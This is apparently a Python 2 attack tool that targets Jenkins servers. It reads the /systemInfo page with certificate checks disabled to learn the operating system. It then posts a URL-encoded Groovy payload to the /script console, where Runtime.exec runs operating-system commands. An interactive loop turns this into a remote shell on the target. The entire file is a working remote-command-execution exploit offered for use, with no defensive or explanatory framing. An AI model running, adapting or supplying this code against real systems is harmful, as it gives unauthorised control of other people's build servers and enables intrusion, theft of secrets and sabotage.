import lib_http
import sys
import os
from bs4 import *
import pycurl
import gzip
import StringIO
import re
import urllib2


cmdpost_1="script=import+java.io.BufferedReader%3B++%0D%0Aimport+java.io.InputStreamReader%3B++%0D%0ABufferedReader+br+%3D+null%3B++%0D%0AProcess+p+%3D+Runtime.getRuntime%28%29.exec%28%22"
cmdpost_2="%22%29%3B++%0D%0Abr+%3D+new+BufferedReader%28new+InputStreamReader%28p.getInputStream%28%29%29%29%3B++%0D%0AString+line+%3D+null%3B++%0D%0AStringBuilder+sb+%3D+new+StringBuilder%28%29%3B++%0D%0Awhile+%28%28line+%3D+br.readLine%28%29%29+%21%3D+null%29+%7B++%0D%0Asb.append%28line+%2B+%22%5Cn%22%29%3B++%0D%0A%7D++%0D%0Aprintln%28sb.toString%28%29%29%3B++&json=%7B%22script%22%3A+%22import+java.io.BufferedReader%3B++%5Cnimport+java.io.InputStreamReader%3B++%5CnBufferedReader+br+%3D+null%3B++%5CnProcess+p+%3D+Runtime.getRuntime%28%29.exec%28%5C%22cmd+%2Fc+dir%5C%22%29%3B++%5Cnbr+%3D+new+BufferedReader%28new+InputStreamReader%28p.getInputStream%28%29%29%29%3B++%5CnString+line+%3D+null%3B++%5CnStringBuilder+sb+%3D+new+StringBuilder%28%29%3B++%5Cnwhile+%28%28line+%3D+br.readLine%28%29%29+%21%3D+null%29+%7B++%5Cnsb.append%28line+%2B+%5C%22%5C%5Cn%5C%22%29%3B++%5Cn%7D++%5Cnprintln%28sb.toString%28%29%29%3B++%22%2C+%22%22%3A+%22cmd+%2Fc+dir%22%7D&Submit=%E8%BF%90%E8%A1%8C"

class jenkins:
    def __init__(self,address):
        self.address=address
        self.current="current"
        self.jenkins=zoomeye=pycurl.Curl()
        self.jenkins.setopt(pycurl.SSL_VERIFYPEER, 0)     # https
        self.jenkins.setopt(pycurl.SSL_VERIFYHOST, 0)
        opts={pycurl.USERAGENT:"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:42.0) Gecko/20100101 Firefox/42.0",\
              pycurl.HTTPHEADER:["Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",\
                                 "Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",\
                                 "Accept-Encoding: gzip, deflate",\
                                 "Connection: keep-alive"]\
              }
        for key,value in opts.iteritems():
            self.jenkins.setopt(key,value) 
        self.getjenkinsinfo()
        #self.zoomc.setopt(pycurl.PROXY,"http://127.0.0.1:8088")
    
    def getjenkinsinfo(self):
        head,body=lib_http.getdata4info(self.address+"/systemInfo",objc=self.jenkins)
        soup=BeautifulSoup(gzip.GzipFile(fileobj=StringIO.StringIO(body)).read())
        tables=soup.findAll('table',{"class":"pane sortable bigtable"})
        systemtable=tables[0].findAll('tr')
        stable={}
        for tr in systemtable:
            tds=tr.findAll('td')
            if tds:
                stable[tds[0].contents[0]]=self.getjenkinss4bag(tds[1])
        self.stable=stable
        
    def getjenkinss4bag(self,tag):
        ss=""
        for s in tag.contents:
            if type(s)==str:
                ss+=s
            else:
                s=re.sub('\</?\w+\>','',str(s))
                ss+=s
        return ss
    
    def jenkinsexec(self,cmd):
        if self.stable['os.name'].find('Win')>=0:
            cmd=urllib2.quote("cmd /c %s" %cmd)
        else:
            cmd=urllib2.quote(cmd)
        postdt="%s%s%s" %(cmdpost_1,cmd,cmdpost_2)
        opt={pycurl.POSTFIELDS:postdt,pycurl.POST:1}
        head,body=lib_http.getdata4info(self.address+'/script',opt,self.jenkins)
        soup=BeautifulSoup(gzip.GzipFile(fileobj=StringIO.StringIO(body)).read())
        rs=soup.h2.nextSibling.contents[0].strip()
        return rs
    
    def getjenkinspwd(self):
        if self.stable['os.name'].find('Win')>=0:
            pwd=self.jenkinsexec('cd')
        else:
            pwd=self.jenkinsexec('pwd')
        self.current=pwd
        return pwd
        
    def start_terminal(self):
        self.getjenkinspwd()
        while 1:
            cmd=raw_input(self.current+">")
            print self.jenkinsexec(cmd)
            
jk=jenkins(sys.argv[1])
jk.start_terminal()